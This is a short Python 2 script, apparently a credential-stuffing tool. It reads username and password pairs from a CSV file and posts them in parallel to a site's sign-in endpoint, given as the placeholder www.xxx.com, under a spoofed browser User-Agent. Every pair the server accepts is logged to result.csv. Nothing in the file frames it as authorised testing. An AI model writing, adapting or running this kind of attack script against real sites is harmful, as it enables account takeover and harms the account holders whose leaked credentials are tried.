# -*- coding: utf-8 -*-
import csv
import logging
import urllib
import urllib2
from multiprocessing import Pool


def pull(kw):
    try:
        if len(kw) == 2:
            print u'尝试: {} , {}'.format(kw[0], kw[1])
            url = 'http://www.xxx.com/Account/SignIn'
            data = urllib.urlencode({
                'userName': kw[0],
                'password': kw[1]
            })
            request = urllib2.Request(url)
            request.add_header('User-Agent',
                               'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) '
                               'Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
            res = urllib2.urlopen(request, data=data)
            content = res.read()
            if 'false' not in content:
                logging.info('{},{}'.format(kw[0], kw[1]))
            else:
                print u'{} {} 错误'.format(kw[0], kw[1])
    except Exception as e:
        print u'他们接口可能挂了，信息是: {}'.format(e.message)


if __name__ == '__main__':
    logging.basicConfig(filename='result.csv', level=logging.INFO, format='%(message)s')
    p = Pool(10)
    allcount = []
    with open('test.csv') as f:
        csf = csv.reader(f)
        for row in csf:
            allcount.append(row)

    p.map(pull, allcount)
